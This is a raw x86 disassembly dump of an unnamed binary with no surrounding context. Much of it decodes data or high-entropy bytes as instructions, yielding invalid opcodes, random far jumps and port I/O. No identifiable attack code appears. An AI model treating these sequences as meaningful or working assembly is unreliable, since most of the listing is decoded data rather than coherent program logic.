  41eb73:	xchg   ebp,eax
  41eb74:	pushf  
  41eb75:	clc    
  41eb76:	cmp    DWORD PTR [esi-0x6ac50764],edx
  41eb7c:	pushf  
  41eb7d:	clc    
  41eb7e:	cmp    edx,DWORD PTR [ebp-0x6ac30764]
  41eb84:	pushf  
  41eb85:	clc    
  41eb86:	cmp    eax,0x3ef89c95
  41eb8b:	xchg   ebp,eax
  41eb8c:	pushf  
  41eb8d:	clc    
  41eb8e:	aas    
  41eb8f:	xchg   ebp,eax
  41eb90:	pushf  
  41eb91:	clc    
  41eb92:	and    BYTE PTR [ebp-0x6ade0764],dl
  41eb98:	pushf  
  41eb99:	clc    
  41eb9a:	sub    BYTE PTR [ebp-0x6130764],dl
  41eba0:	add    esp,DWORD PTR [eax+0x62]
  41eba3:	jmp    0x726bebe9
  41eba8:	inc    edx
  41eba9:	add    BYTE PTR [ecx+0x49],bl
  41ebac:	imul   di,WORD PTR [eax],0xff85
  41ebb0:	pushf  
  41ebb1:	clc    
  41ebb2:	popf   
  41ebb3:	jmp    0xb54f308
  41ebb8:	add    BYTE PTR [eax],al
  41ebba:	pop    esi
  41ebbb:	jmp    0xbdcec01
  41ebc0:	add    al,0xe
	...
  41ebf2:	add    BYTE PTR [eax],dl
  41ebf4:	inc    eax
  41ebf5:	add    BYTE PTR [esi-0x7e],cl
  41ebf8:	inc    edx
  41ebf9:	add    BYTE PTR [eax],al
  41ebfb:	add    BYTE PTR [eax],al
  41ebfd:	add    BYTE PTR [ecx+0x0],cl
  41ec00:	inc    esp
  41ec01:	add    BYTE PTR [ecx+0x0],ch
  41ec04:	add    BYTE PTR fs:[ebx+0x0],cl
  41ec08:	dec    edx
  41ec09:	add    BYTE PTR [ebx+0x0],cl
  41ec0c:	dec    edx
  41ec0d:	add    BYTE PTR [eax+eax*1+0x6b],al
  41ec11:	add    BYTE PTR [eax+eax*1+0x6a],ch
  41ec15:	add    BYTE PTR [eax+eax*1+0x4c],al
  41ec19:	add    BYTE PTR [ecx+0x0],cl
  41ec1c:	inc    esp
  41ec1d:	add    BYTE PTR [eax+eax*1+0x49],cl
  41ec21:	add    BYTE PTR [ebp+0x0],dl
  41ec24:	dec    edx
  41ec25:	add    BYTE PTR [ebx+0x0],cl
  41ec28:	inc    esp
  41ec29:	add    BYTE PTR [eax+eax*1+0x4a],cl
  41ec2d:	add    BYTE PTR [ebx+0x0],cl
  41ec30:	dec    eax
  41ec31:	add    BYTE PTR [eax+eax*1+0x4a],al
  41ec35:	add    BYTE PTR [eax],al
  41ec37:	add    BYTE PTR [eax],al
  41ec39:	add    dh,bh
  41ec3b:	jmp    0x41ec7e
	...
  41ec45:	add    BYTE PTR [eax+0x59004191],bl
  41ec4b:	dec    edi
  41ec4c:	pop    edi
  41ec4d:	dec    edi
  41ec4e:	inc    eax
  41ec4f:	dec    edi
  41ec50:	inc    esp
  41ec51:	dec    edi
  41ec52:	pop    edi
  41ec53:	dec    edi
  41ec54:	inc    esi
  41ec55:	dec    edi
  41ec56:	add    DWORD PTR [edi+0x0],ecx
  41ec59:	dec    edi
  41ec5a:	xor    cl,BYTE PTR [edi+0x0]
  41ec5d:	add    BYTE PTR [ebp+0x4f],bl
  41ec60:	pop    esi
  41ec61:	dec    edi
  41ec62:	pop    ebx
  41ec63:	dec    edi
  41ec64:	add    DWORD PTR [edi+0x0],ecx
  41ec67:	dec    edi
  41ec68:	xor    cl,BYTE PTR [edi+0x4f]
  41ec6b:	dec    edi
  41ec6c:	inc    ecx
  41ec6d:	dec    edi
  41ec6e:	pop    edi
  41ec6f:	dec    edi
  41ec70:	inc    eax
  41ec71:	dec    edi
  41ec72:	add    DWORD PTR [edi+0x0],ecx
  41ec75:	dec    edi
  41ec76:	xor    cl,BYTE PTR [edi+0x0]
  41ec79:	add    BYTE PTR [ecx+0x4f],al
  41ec7c:	pop    edx
  41ec7d:	dec    edi
  41ec7e:	inc    esi
  41ec7f:	dec    edi
  41ec80:	dec    ebp
  41ec81:	dec    edi
  41ec82:	push   ebx
  41ec83:	dec    edi
  41ec84:	inc    edx
  41ec85:	dec    edi
  41ec86:	pop    ebx
  41ec87:	dec    edi
  41ec88:	xor    cl,BYTE PTR [edi+0x0]
  41ec8b:	add    BYTE PTR [eax],al
  41ec8d:	add    BYTE PTR [esi+0x7d],ch
  41ec90:	outs   dx,BYTE PTR ds:[esi]
  41ec91:	lea    ebp,[esi-0x63]
  41ec94:	outs   dx,BYTE PTR ds:[esi]
  41ec95:	lods   eax,DWORD PTR ds:[esi]
  41ec96:	outs   dx,BYTE PTR ds:[esi]
  41ec97:	mov    ebp,0xdd6ecd6e
  41ec9c:	outs   dx,BYTE PTR ds:[esi]
  41ec9d:	in     eax,dx
  41ec9e:	outs   dx,BYTE PTR ds:[esi]
  41ec9f:	std    
  41eca0:	outs   dx,BYTE PTR ds:[esi]
  41eca1:	or     eax,0x2d6e1d6e
  41eca6:	outs   dx,BYTE PTR ds:[esi]
  41eca7:	cmp    eax,0x6d6e5d6e
  41ecac:	outs   dx,BYTE PTR ds:[esi]
  41ecad:	jb     0x41ed1d
  41ecaf:	jae    0x41ed1f
  41ecb1:	jo     0x41ed21
  41ecb3:	jno    0x41ed23
  41ecb5:	jbe    0x41ed25
  41ecb7:	ja     0x41ed27
  41ecb9:	je     0x41ed29
  41ecbb:	jne    0x41ed2b
  41ecbd:	mov    ch,BYTE PTR [esi-0x75]
  41ecc0:	outs   dx,BYTE PTR ds:[esi]
  41ecc1:	mov    BYTE PTR [esi-0x77],ch
  41ecc4:	outs   dx,BYTE PTR ds:[esi]
  41ecc5:	mov    gs,WORD PTR [esi+0x7c]
  41ecc8:	pop    esi
  41ecc9:	jge    0x41ed19
  41eccb:	jge    0x41ec8b
  41eccd:	jge    0x41ed2b
  41eccf:	(bad)  
  41ecd0:	jge    0x41ed42
  41ecd2:	mov    ebp,0x71736eb1
  41ecd7:	bound  ebp,QWORD PTR [edx+0x70265fc6]
  41ecdd:	add    BYTE PTR [ebp+0x17],cl
  41ece0:	mov    ebx,0x4af4bd56
  41ece5:	aaa    
  41ece6:	dec    edx
  41ece7:	jle    0x41ec86
  41ece9:	jno    0x41ed3f
  41eceb:	mov    cl,0x8
  41eced:	imul   ebp,DWORD PTR [eax+ecx*1+0x58fd7d8],0x48
  41ecf5:	xlat   BYTE PTR ds:[ebx]
  41ecf6:	lds    edx,FWORD PTR [ebx+0x7dc4114c]
  41ecfc:	ret    
  41ecfd:	fidiv  WORD PTR [edi]
  41ecff:	into   
  41ed00:	mul    BYTE PTR [esi+0x1faa3204]
  41ed06:	push   0xc5c644f1
  41ed0b:	sbb    ch,al
  41ed0d:	jno    0x41ed0f
  41ed0f:	add    BYTE PTR [eax],al
  41ed11:	add    dh,ch
  41ed13:	(bad)  [ebx+0x7]
  41ed16:	mov    edx,0x450041eb
  41ed1b:	das    
  41ed1c:	shl    BYTE PTR [edx],0xb4
  41ed1f:	rol    BYTE PTR [ecx+0x0],1
  41ed22:	inc    esi
  41ed23:	push   ebx
  41ed24:	outs   dx,DWORD PTR ds:[esi]
  41ed25:	push   ebx
  41ed26:	push   edx
  41ed27:	jmp    0x41ed6a
  41ed29:	add    BYTE PTR [esi-0x71ffbe15],dh
  41ed2f:	in     eax,dx
  41ed30:	adc    al,BYTE PTR [edi]
  41ed32:	jae    0x41ed9d
  41ed34:	inc    edx
  41ed35:	jae    0x41ed9c
  41ed37:	popa   
  41ed38:	push   ecx
  41ed39:	pop    eax
  41ed3a:	pop    ecx
  41ed3b:	outs   dx,BYTE PTR ds:[esi]
  41ed3c:	jbe    0x41edb6
  41ed3e:	jns    0x41ed94
  41ed40:	push   ecx
  41ed41:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  41ed45:	je     0x41edb6
  41ed47:	jns    0x41edb7
  41ed49:	popa   
  41ed4a:	push   esi
  41ed4b:	push   ebp
  41ed4c:	push   0x57564476
  41ed51:	dec    edx
  41ed52:	imul   edx,DWORD PTR [ebx+0x4b],0x78575065
  41ed59:	popa   
	...
  41ed6e:	jp     0x41edc4
  41ed70:	arpl   WORD PTR [ecx+0x4b],cx
  41ed73:	push   edx
  41ed74:	imul   ebp,DWORD PTR [eax+0x45],0x55487459
  41ed7b:	jp     0x41ede9
  41ed7d:	jb     0x41edd2
  41ed7f:	outs   dx,DWORD PTR ds:[esi]
  41ed80:	push   ebx
  41ed81:	inc    esi
  41ed82:	inc    edi
  41ed83:	push   0x66495949
  41ed88:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  41ed8c:	push   esi
  41ed8d:	jb     0x41edf7
  41ed8f:	add    BYTE PTR [ecx+0x43],ah
  41ed92:	push   ecx
  41ed93:	ins    BYTE PTR es:[edi],dx
  41ed94:	pop    eax
  41ed95:	ja     0x41ede4
  41ed97:	je     0x41ee0f
  41ed99:	bound  eax,QWORD PTR [ebx+eiz*2+0x0]
  41ed9d:	add    BYTE PTR [edi+0x56],dl
  41eda0:	push   esp
  41eda1:	dec    eax
  41eda2:	je     0x41edf0
  41eda4:	push   ebx
  41eda5:	jne    0x41ee12
  41eda7:	popa   
  41eda8:	jns    0x41edaa
  41edaa:	dec    edi
  41edab:	push   esp
  41edac:	dec    edi
  41edad:	dec    ebx
  41edae:	pop    edi
  41edaf:	pop    ebx
  41edb0:	dec    edi
  41edb1:	push   esp
  41edb2:	add    bl,BYTE PTR [esi]
  41edb4:	adc    ch,BYTE PTR ds:0x4963b4cf
  41edba:	push   eax
  41edbb:	jge    0x41edbe
  41edbd:	add    BYTE PTR [esi+eax*1+0x0],bh
  41edc1:	add    ch,ah
  41edc3:	xchg   esp,eax
  41edc4:	stos   DWORD PTR es:[edi],eax
  41edc5:	dec    esi
  41edc6:	fild   DWORD PTR [esi]
  41edc8:	jle    0x41ed84
  41edca:	shr    al,cl
  41edcc:	cld    
  41edcd:	and    esp,edi
  41edcf:	mov    bl,0x84
  41edd1:	in     al,dx
  41edd2:	dec    edx
  41edd3:	call   0xd6b2aa95
  41edd8:	sbb    BYTE PTR [esi+0x10],ch
  41eddb:	mov    ah,0x81
  41eddd:	int    0xad
  41eddf:	out    dx,eax
  41ede0:	mov    edx,0xcb7088c6
  41ede5:	push   0xf6b4984
  41edea:	cwde   
  41edeb:	(bad)  
  41eded:	jno    0x41edf8
  41edef:	sbb    al,0xc5
  41edf1:	add    ebx,edi
  41edf3:	dec    eax
  41edf4:	sub    al,0x59
  41edf6:	dec    ebp
  41edf7:	mov    ah,BYTE PTR [eax]
  41edf9:	mov    dh,0xdb
  41edfb:	loope  0x41ee2d
  41edfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edfe:	lock mov DWORD PTR [edi],ebx
  41ee01:	dec    eax
  41ee02:	call   0x1d0756eb
  41ee07:	mov    bh,0x66
  41ee09:	mov    bl,0xfd
  41ee0b:	sbb    al,0x4e
  41ee0d:	cmp    BYTE PTR [edi],bl
  41ee0f:	push   es
  41ee10:	mov    ebx,eax
  41ee12:	or     dh,BYTE PTR [ecx+0x12]
  41ee15:	mov    cl,0xc1
  41ee17:	xchg   esi,eax
  41ee18:	retf   
  41ee19:	outs   dx,DWORD PTR ds:[esi]
  41ee1a:	add    DWORD PTR [ebx+0x10bc7e76],edx
  41ee20:	and    DWORD PTR [ebx-0x63],ecx
  41ee23:	sub    al,0xba
  41ee25:	shl    BYTE PTR [ecx],0xa9
  41ee28:	mov    ch,0xf2
  41ee2a:	lods   al,BYTE PTR ds:[esi]
  41ee2b:	sub    bl,BYTE PTR [ecx]
  41ee2d:	jae    0x41ee62
  41ee2f:	mov    ch,BYTE PTR [ebx+eax*2]
  41ee32:	gs fwait
  41ee34:	pop    esp
  41ee35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee36:	scas   eax,DWORD PTR es:[edi]
  41ee37:	sbb    al,0x25
  41ee39:	dec    ecx
  41ee3a:	mov    eax,0xbf7d5667
  41ee3f:	push   eax
  41ee40:	je     0x41edc4
  41ee42:	mov    bh,0xcf
  41ee44:	pop    es
  41ee45:	pop    ds
  41ee46:	jbe    0x41edf3
  41ee48:	xor    edx,DWORD PTR [ecx-0x14edc97d]
  41ee4e:	inc    ebx
  41ee4f:	push   ds
  41ee50:	jp     0x41ee5d
  41ee52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee53:	xor    esp,DWORD PTR [edi+0x21]
  41ee56:	inc    BYTE PTR [ecx+0x6c]
  41ee59:	mov    edi,0x1cec6abc
  41ee5e:	mov    ch,0x5a
  41ee60:	sub    al,0x3a
  41ee62:	popa   
  41ee63:	pop    DWORD PTR [ebp+esi*2+0x52]
  41ee67:	mov    ecx,0x7e4c628a
  41ee6c:	jnp    0x41ee80
  41ee6e:	sbb    bh,BYTE PTR [esp+esi*4-0x779618fe]
  41ee75:	pop    es
  41ee76:	call   0xa144be75
  41ee7b:	push   edi
  41ee7c:	bound  edx,QWORD PTR [edx-0x1b4b3b87]
  41ee82:	adc    ebx,DWORD PTR [ebx+0x1f]
  41ee85:	mov    al,ds:0x8af4714d
  41ee8a:	mov    ebx,0x64066a53
  41ee8f:	xchg   esp,eax
  41ee90:	gs inc ebp
  41ee92:	stc    
  41ee93:	jae    0x41eea9
  41ee95:	ins    BYTE PTR es:[edi],dx
  41ee96:	add    DWORD PTR [ecx-0x4778ae92],0x25d0bb80
  41eea0:	cmp    bh,BYTE PTR [esi]
  41eea2:	call   0xc3b4:0x36cd40f
  41eea9:	jp     0x41ee90
  41eeab:	icebp  
  41eeac:	mov    edx,0xfabc63b
  41eeb1:	(bad)  
  41eeb2:	es cmp cl,cl
  41eeb5:	dec    eax
  41eeb6:	pusha  
  41eeb7:	test   al,0xf1
  41eeb9:	push   ss
  41eeba:	inc    ebx
  41eebb:	imul   BYTE PTR [ecx-0x64]
  41eebe:	inc    ebp
  41eebf:	sub    ebx,DWORD PTR [ebx+esi*1+0x674750f5]
  41eec6:	add    BYTE PTR [edx+eiz*8],0xd5
  41eeca:	mov    ds:0xe8dbfe9a,eax
  41eecf:	mov    dl,0xb2
  41eed1:	popf   
  41eed2:	out    0x6c,eax
  41eed4:	xchg   edx,eax
  41eed5:	mov    eax,ds:0x7d3b34e
  41eeda:	xchg   edx,eax
  41eedb:	pop    esp
  41eedc:	push   edi
  41eedd:	push   ecx
  41eede:	(bad)  
  41eedf:	pop    esp
  41eee0:	fld    QWORD PTR [esi+ecx*1-0x72]
  41eee4:	test   eax,0x7696670b
  41eee9:	xchg   esp,eax
  41eeea:	dec    edx
  41eeeb:	and    eax,0xfe6edfc4
  41eef0:	retf   0x5301
  41eef3:	cmc    
  41eef4:	cdq    
  41eef5:	call   0x3d7560ce
  41eefa:	cwde   
  41eefb:	lock data16 fistp QWORD PTR [ecx*2-0x197f15b9]
  41ef04:	stc    
  41ef05:	push   0xe585656e
  41ef0a:	push   ebp
  41ef0b:	or     bh,bl
  41ef0d:	fst    QWORD PTR [edi+0x5324d090]
  41ef13:	mov    ah,0xd4
  41ef15:	aaa    
  41ef16:	and    al,0xab
  41ef18:	lahf   
  41ef19:	fldcw  WORD PTR [edi]
  41ef1b:	fst    DWORD PTR [ecx-0x69]
  41ef1e:	jb     0x41ef40
  41ef20:	xchg   esp,eax
  41ef21:	mov    esi,0xf0c7599b
  41ef26:	outs   dx,DWORD PTR ds:[esi]
  41ef27:	mov    dh,0x88
  41ef29:	(bad)  
  41ef2a:	and    ebx,DWORD PTR [edi-0x7f]
  41ef2d:	adc    BYTE PTR [ebx+0x26601952],bl
  41ef33:	out    dx,eax
  41ef34:	ins    BYTE PTR es:[edi],dx
  41ef35:	mov    dh,BYTE PTR [ecx-0x673cf27b]
  41ef3b:	enter  0x84c2,0x64
  41ef3f:	inc    esi
  41ef40:	in     eax,dx
  41ef41:	loopne 0x41ef1a
  41ef43:	imul   eax,DWORD PTR [esi],0x7a
  41ef46:	cld    
  41ef47:	sbb    DWORD PTR [esi],edi
  41ef49:	push   cs
  41ef4a:	pop    ss
  41ef4b:	dec    edi
  41ef4c:	cld    
  41ef4d:	enter  0x457f,0xd6
  41ef51:	icebp  
  41ef52:	idiv   DWORD PTR [edx]
  41ef54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef55:	jecxz  0x41ef12
  41ef57:	mov    ch,0x6c
  41ef59:	dec    esp
  41ef5a:	fucom  st(4)
  41ef5c:	jno    0x41ef8f
  41ef5e:	lock or al,0xff
  41ef61:	inc    esi
  41ef62:	out    dx,eax
  41ef63:	(bad)  
  41ef64:	ds rol bl,0x4e
  41ef68:	mov    al,ds:0x1e026f1f
  41ef6d:	stos   BYTE PTR es:[edi],al
  41ef6e:	adc    DWORD PTR [ebp+0x389197ba],esi
  41ef74:	cmp    BYTE PTR [esp+ecx*4],ch
  41ef77:	fcomi  st,st(3)
  41ef79:	sar    DWORD PTR [eax+0x6d],1
  41ef7c:	cli    
  41ef7d:	xchg   esp,eax
  41ef7e:	fldcw  WORD PTR [esi+0x49]
  41ef81:	fwait
  41ef82:	push   ebx
  41ef83:	das    
  41ef84:	add    BYTE PTR [edx+0x79],bl
  41ef87:	dec    edx
  41ef88:	ror    ah,cl
  41ef8a:	out    0x8,al
  41ef8c:	jbe    0x41efbe
  41ef8e:	mov    edx,0xb8a32e53
  41ef93:	ja     0x41ef2f
  41ef95:	shl    BYTE PTR [ebp-0x51540075],0x5a
  41ef9c:	dec    esi
  41ef9d:	xor    al,0x78
  41ef9f:	adc    al,BYTE PTR [ecx+0x72]
  41efa2:	dec    ecx
  41efa3:	mov    cl,0xa4
  41efa5:	mov    edi,0xa6c06b57
  41efaa:	(bad)  
  41efab:	mov    ds:0xb94ab793,eax
  41efb0:	shr    DWORD PTR [ebx+0x1f],1
  41efb3:	pop    esi
  41efb5:	jle    0x41efcc
  41efb7:	xchg   ebp,eax
  41efb8:	lea    ebp,[ebx]
  41efba:	cmp    ebx,esp
  41efbc:	(bad)  
  41efbe:	push   esp
  41efbf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efc0:	sub    dl,BYTE PTR [edx]
  41efc2:	push   ss
  41efc3:	out    dx,eax
  41efc4:	fstp   DWORD PTR [ebp-0x1559035f]
  41efca:	cmp    ebx,DWORD PTR [esp+edi*8-0x79]
  41efce:	rol    DWORD PTR [esp+edx*4],1
  41efd1:	jmp    0x77c:0x5ab5c26d
  41efd8:	pop    ecx
  41efd9:	xor    al,0x7f
  41efdb:	ret    0x9b75
  41efde:	mov    bh,BYTE PTR [edx+ebx*1]
  41efe1:	rcl    dh,1
  41efe3:	xchg   edx,eax
  41efe4:	aaa    
  41efe5:	aaa    
  41efe6:	and    al,0x63
  41efe8:	cmp    cl,BYTE PTR [edx-0x3ee5787d]
  41efee:	pop    esi
  41efef:	inc    ebx
  41eff0:	repz loope 0x41f033
  41eff3:	ret    0x9ea2
  41eff6:	push   cs
  41eff7:	adc    cl,BYTE PTR [edi]
  41eff9:	(bad)  
  41effa:	in     eax,0x1
  41effc:	sub    al,0x49
  41effe:	sub    eax,0x8410f1a7
  41f003:	cmc    
  41f004:	adc    DWORD PTR [edi],esi
  41f006:	sbb    al,0x21
  41f008:	fild   WORD PTR [eax]
  41f00a:	xchg   esi,eax
  41f00b:	or     esi,DWORD PTR [edx-0x3e359812]
  41f011:	pop    ecx
  41f012:	call   0xe82:0x3a17d84d
  41f019:	lods   eax,DWORD PTR ds:[esi]
  41f01a:	ins    DWORD PTR es:[edi],dx
  41f01b:	pop    edi
  41f01c:	sub    al,BYTE PTR [eax]
  41f01e:	push   es
  41f01f:	addr16 pop esi
  41f021:	ins    DWORD PTR es:[edi],dx
  41f022:	and    DWORD PTR [ebp-0x4d],esi
  41f025:	jl     0x41f07e
  41f027:	mov    eax,ds:0xa57b32e9
  41f02c:	(bad)  
  41f02e:	ins    DWORD PTR es:[edi],dx
  41f02f:	je     0x41efe2
  41f031:	add    BYTE PTR [ebx+0x74],dl
  41f034:	sbb    BYTE PTR [edx],dl
  41f036:	push   ecx
  41f037:	push   0x31
  41f039:	loop   0x41f0ac
  41f03b:	and    eax,0xb61eb2ec
  41f040:	push   esp
  41f041:	xor    BYTE PTR [ebx+eax*8],bh
  41f044:	inc    esp
  41f045:	lock xchg esi,eax
  41f047:	je     0x41f01a
  41f049:	test   esi,edx
  41f04b:	aaa    
  41f04c:	mov    edi,0x93ce12b2
  41f051:	test   eax,0x2e7e0bf
  41f056:	push   ebx
  41f057:	sub    DWORD PTR [esi],esi
  41f059:	jmp    0xebc8c673
  41f05e:	and    al,0x83
  41f060:	add    BYTE PTR [edi],dh
  41f062:	add    DWORD PTR [edx+0x57],esi
  41f065:	push   edi
  41f066:	stos   DWORD PTR es:[edi],eax
  41f067:	lea    ebp,[edx]
  41f069:	xchg   ebp,eax
  41f06a:	sub    bl,BYTE PTR [edx-0x6]
  41f06d:	jmp    0xb69281be
  41f072:	add    dh,ah
  41f074:	dec    ebp
  41f075:	(bad)  
  41f076:	sti    
  41f077:	jle    0x41f075
  41f079:	test   eax,0xb02c11be
  41f07e:	mov    edi,0x38a81988
  41f083:	or     al,0x2
  41f085:	adc    esp,DWORD PTR [ecx+0x2922357d]
  41f08b:	fs push esi
  41f08d:	push   ecx
  41f08e:	mov    ebx,0x94d609ef
  41f093:	dec    ebx
  41f094:	call   0x98da:0xd951fe1a
  41f09b:	lods   eax,DWORD PTR ds:[esi]
  41f09c:	les    eax,FWORD PTR [ebx-0x10b2f540]
  41f0a2:	push   ss
  41f0a3:	repz pop es
  41f0a5:	icebp  
  41f0a6:	outs   dx,DWORD PTR es:[esi]
  41f0a8:	jo     0x41f0ae
  41f0aa:	stc    
  41f0ab:	push   es
  41f0ac:	outs   dx,BYTE PTR ds:[esi]
  41f0ad:	fprem  
  41f0af:	mov    ebp,0xbae072cd
  41f0b4:	enter  0x1682,0x3a
  41f0b8:	inc    edi
  41f0b9:	ins    BYTE PTR es:[edi],dx
  41f0ba:	lock stos BYTE PTR es:[edi],al
  41f0bc:	clc    
  41f0bd:	mov    ds:0x8c6460ce,eax
  41f0c2:	aaa    
  41f0c3:	and    eax,0xd9eec471
  41f0c8:	add    ch,ah
  41f0ca:	(bad)  
  41f0cd:	pop    esi
  41f0ce:	mov    edx,0x3e39ae2
  41f0d3:	out    0x7a,eax
  41f0d5:	xchg   DWORD PTR [esi+0x5],ecx
  41f0d8:	push   ebp
  41f0d9:	rol    BYTE PTR [ecx],1
  41f0db:	loope  0x41f07d
  41f0dd:	retf   0x6768
  41f0e0:	imul   eax,DWORD PTR [edi-0x25f44e36],0x6f12c2ba
  41f0ea:	stos   BYTE PTR es:[edi],al
  41f0eb:	push   ebx
  41f0ec:	and    bl,BYTE PTR [ebx+0x60402534]
  41f0f2:	iret   
  41f0f3:	addr16 int 0x9a
  41f0f6:	jecxz  0x41f0ac
  41f0f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0f9:	test   BYTE PTR [ebp-0x4b],ch
  41f0fc:	jb     0x41f15e
  41f0fe:	add    eax,esp
  41f100:	pop    DWORD PTR [eax]
  41f102:	dec    esp
  41f103:	loopne 0x41f08e
  41f105:	mov    eax,0xb07e2725
  41f10a:	inc    esp
  41f10b:	or     DWORD PTR [edx],eax
  41f10d:	adc    DWORD PTR [edx+0x1a04f184],ebx
  41f113:	ror    DWORD PTR [ebx*2+0x71f83648],0xcd
  41f11b:	xchg   esi,eax
  41f11c:	xor    BYTE PTR [ebx-0x7],ah
  41f11f:	or     BYTE PTR [edx-0x47],ah
  41f122:	xor    edi,edx
  41f124:	mov    WORD PTR [ebp*8+0x111e2ae8],es
  41f12b:	aam    0xb3
  41f12d:	popa   
  41f12e:	sti    
  41f12f:	outs   dx,BYTE PTR ds:[esi]
  41f130:	in     al,0x22
  41f132:	in     al,dx
  41f133:	imul   esi,DWORD PTR [ebp-0x25],0x5b
  41f137:	push   ss
  41f138:	es add al,0xb1
  41f13b:	outs   dx,DWORD PTR ds:[esi]
  41f13c:	mov    bh,0xb9
  41f13e:	mov    ebx,0xee3c2ca2
  41f143:	sbb    eax,0xbfabcc32
  41f148:	sbb    bl,ah
  41f14a:	mov    ah,0xfb
  41f14c:	stos   BYTE PTR es:[edi],al
  41f14d:	mov    BYTE PTR [esi+0x5469d267],ah
  41f153:	or     eax,0x9a851f36
  41f158:	mov    edi,0x4f2bc118
  41f15d:	ficomp WORD PTR [eax]
  41f15f:	mov    eax,0x7d04d60b
  41f164:	fcom   DWORD PTR [eax+0x7c9feeae]
  41f16a:	gs pop ds
  41f16c:	inc    ebp
  41f16d:	in     al,dx
  41f16e:	(bad)  
  41f16f:	daa    
  41f170:	mov    ax,0x806b
  41f174:	mov    ds:0xfde6659b,al
  41f179:	fimul  WORD PTR [ecx-0x335d4fe2]
  41f17f:	sub    cl,BYTE PTR [esi]
  41f181:	or     DWORD PTR [ecx+0x45],ecx
  41f184:	(bad)  
  41f185:	mov    esi,eax
  41f187:	dec    ebp
  41f188:	sbb    DWORD PTR [ebx],eax
  41f18a:	scas   al,BYTE PTR es:[edi]
  41f18b:	rcr    BYTE PTR [ecx],cl
  41f18d:	int3   
  41f18e:	dec    ebp
  41f18f:	xor    ah,BYTE PTR [esi+0x3fe31e98]
  41f195:	loope  0x41f1ba
  41f197:	mov    dl,0xa8
  41f199:	popf   
  41f19a:	ds ja  0x41f165
  41f19d:	mov    cs,WORD PTR [ecx+0x274f3260]
  41f1a3:	xor    al,0x9a
  41f1a5:	inc    edx
  41f1a6:	jle    0x41f1a2
  41f1a8:	aaa    
  41f1a9:	add    ch,BYTE PTR [eax]
  41f1ab:	mov    ds:0x13604bc,al
  41f1b0:	nop
  41f1b1:	cmc    
  41f1b2:	sub    DWORD PTR [ebx+0x61],eax
  41f1b5:	and    al,0x25
  41f1b7:	push   edi
  41f1b8:	cmp    BYTE PTR [ebx+0x5d3f7dd4],0x1a
  41f1bf:	sub    eax,0xdbd510b2
  41f1c4:	(bad)  
  41f1c5:	das    
  41f1c6:	adc    DWORD PTR [ebp+0x42],ebp
  41f1c9:	in     eax,0xd8
  41f1cb:	push   ecx
  41f1cc:	outs   dx,DWORD PTR ds:[esi]
  41f1cd:	adc    eax,0x49519111
  41f1d2:	cwde   
  41f1d3:	xor    dh,bh
  41f1d5:	cmp    dl,BYTE PTR [edi-0xa8b940d]
  41f1db:	stos   BYTE PTR es:[edi],al
  41f1dc:	jg     0x41f1b7
  41f1de:	mov    esi,DWORD PTR [edx-0x4b]
  41f1e1:	xchg   esp,eax
  41f1e2:	pop    ebx
  41f1e3:	adc    edx,edx
  41f1e5:	cmp    esp,esi
  41f1e7:	pop    ds
  41f1e8:	leave  
  41f1e9:	addr16 xchg ecx,eax
  41f1eb:	imul   DWORD PTR [ebp+0x15]
  41f1ee:	(bad)  
  41f1f0:	jmp    0x4dc8e450
  41f1f5:	(bad)
  41f1f9:	inc    ebp
  41f1fa:	xor    eax,0x201deb48
  41f1ff:	xor    BYTE PTR [ebx],dh
  41f201:	aaa    
  41f202:	mov    bh,0xaf
  41f204:	out    dx,al
  41f205:	xlat   BYTE PTR ds:[ebx]
  41f206:	adc    bl,bl
  41f208:	ret    
  41f209:	adc    ah,cl
  41f20b:	sar    eax,1
  41f20d:	mov    DWORD PTR [edi-0x67],esi
  41f210:	xchg   ebp,eax
  41f211:	(bad)  
  41f212:	jp     0x41f22a
  41f214:	mov    edi,0xec3db506
  41f219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f21a:	dec    edx
  41f21b:	inc    ebx
  41f21c:	imul   esp,DWORD PTR [ebx+0x59b69aba],0x27b976a4
  41f226:	push   es
  41f227:	stc    
  41f228:	jo     0x41f1e0
  41f22a:	call   0xcf2a0103
  41f22f:	(bad)  
  41f230:	adc    BYTE PTR ds:0xd4ddc26a,bl
  41f236:	xor    eax,esi
  41f238:	nop
  41f239:	jnp    0x41f283
  41f23b:	call   0x1c12c5ee
  41f240:	jns    0x41f1dc
  41f242:	mul    BYTE PTR [ebp-0x7706bf89]
  41f248:	in     al,0x94
  41f24a:	push   cs
  41f24b:	sbb    al,0xf0
  41f24d:	jb     0x41f25a
  41f24f:	push   es
  41f250:	pop    ecx
  41f251:	xor    BYTE PTR [esi+0x20f1b86e],dl
  41f257:	mov    cl,BYTE PTR [edi-0x3d]
  41f25a:	xor    eax,0x6b31aade
  41f25f:	cs xchg edx,eax
  41f261:	retf   
  41f262:	ret    0x2dba
  41f265:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f266:	add    eax,DWORD PTR [esi]
  41f268:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f269:	imul   ecx,ebp,0x58
  41f26c:	push   ecx
  41f26d:	jmp    0xfdb9a0b4
  41f272:	push   edi
  41f273:	mov    dh,0x4e
  41f275:	push   0x39
  41f277:	jp     0x41f230
  41f279:	jo     0x41f202
  41f27b:	(bad)  
  41f27d:	push   edx
  41f27e:	and    BYTE PTR [edi-0x75d89426],ah
  41f284:	mov    eax,0x3c5994bb
  41f289:	xor    al,0x4
  41f28b:	inc    ebp
  41f28c:	ins    BYTE PTR es:[edi],dx
  41f28d:	shl    DWORD PTR [edi+0x3639514b],1
  41f293:	inc    ebp
  41f294:	enter  0x9fd7,0x61
  41f298:	xchg   esp,eax
  41f299:	scas   eax,DWORD PTR es:[edi]
  41f29a:	js     0x41f2dc
  41f29c:	xchg   ebp,eax
  41f29d:	or     BYTE PTR [ebp+0x1f],bl
  41f2a0:	jae    0x41f23b
  41f2a2:	mov    ds:0xb38ecd65,eax
  41f2a7:	xsave  ds:0x4978ce80
  41f2ae:	fsub   DWORD PTR [edx+0x5b40e5ab]
